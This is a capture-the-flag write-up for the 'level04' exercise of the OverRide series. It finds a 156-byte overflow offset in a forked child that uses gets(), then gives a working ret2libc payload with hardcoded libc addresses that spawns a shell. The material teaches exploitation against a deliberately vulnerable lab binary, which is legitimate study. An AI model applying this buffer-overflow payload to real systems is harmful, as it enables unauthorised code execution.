# level04

## using GDB

- Follow the child process in GDB:

```gdb
set follow-fork-mode child
```

## the code

- The code forks in parent and child.
- The parent tracks the child process using `ptrace`.
- If something goes wrong, it sends a signal to the child, who will hang out (instead of terminating or segfaulting).
- In the child, a buffer of size 128 seams eager to overflow with the data provided by a `gets` method.
- But... When we try to overflow, the code hang up the process instead of segfaulting. Which is not a problem.

## offset

- I searched for the offset by dichotomy, and found:

```console
level04@OverRide:~$ (python -c 'print("A" * 156)') | ./level04
Give me some shellcode, k
Give me some shellcode, k
```

- The offset is 156.

## ret2libc

- We reuse the addresses found in level01:

```console
(python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04
```
